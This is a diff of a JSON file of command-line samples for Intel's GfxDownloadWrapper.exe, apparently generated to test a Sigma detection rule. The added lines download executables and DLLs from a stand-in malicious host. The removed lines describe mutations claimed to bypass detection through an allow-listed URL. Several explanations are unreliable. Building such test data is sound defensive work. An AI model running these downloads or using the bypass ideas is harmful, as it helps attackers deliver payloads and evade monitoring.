@@ -1,18 +1,22 @@
 [
   {
-    "output": "GfxDownloadWrapper.exe https://gameplayapi.intel.com/legitfile.exe",
-    "explanation": "This command uses a legitimate URL from the filter_main_known_urls to bypass the Sigma rule detection while maintaining valid syntax."
+    "output": "GfxDownloadWrapper.exe -u \"http://malicious-site.com/file.exe\"",
+    "explanation": "This command simulates a file download via GfxDownloadWrapper.exe using a URL. It matches the Sigma rule by containing 'http://' in the command line."
   },
   {
-    "output": "GfxDownloadWrapper.exe \"https://gameplayapi.intel.com/legitfile.exe\"",
-    "explanation": "Adding quotes around the URL is a safe mutation technique that does not alter the behavior but changes the command structure slightly."
+    "output": "GfxDownloadWrapper.exe --url https://malicious-site.com/data.bin",
+    "explanation": "This command uses the long-form option '--url' instead of a short flag and includes 'https://', which matches the Sigma rule."
   },
   {
-    "output": "GfxDownloadWrapper.exe https://gameplayapi.intel.com/legitfile.exe\\",
-    "explanation": "Appending a backslash at the end of the URL is an allowed mutation that does not affect the core functionality and may bypass detection."
+    "output": "GfxDownloadWrapper.exe http://malicious-site.com/resource.dll",
+    "explanation": "This command omits any flags and directly passes the URL as an argument, matching the Sigma rule by containing 'http://'."
   },
   {
-    "output": "GfxDownloadWrapper.exe https://gameplayapi.intel.com/legitfile.exe # comment",
-    "explanation": "Appending a comment after the URL is a safe mutation that does not alter the execution behavior but changes the command line structure."
+    "output": "GfxDownloadWrapper.exe -u http://malicious-site.com\\file.exe",
+    "explanation": "This command uses an escaped backslash in the URL path, which is parsed correctly and still matches the Sigma rule."
+  },
+  {
+    "output": "GfxDownloadWrapper.exe -u \"http://malicious-site.com/\"/malware.exe",
+    "explanation": "This command uses a quoted URL with a trailing slash and an appended filename, which is still parsed correctly and matches the Sigma rule."
   }
 ]
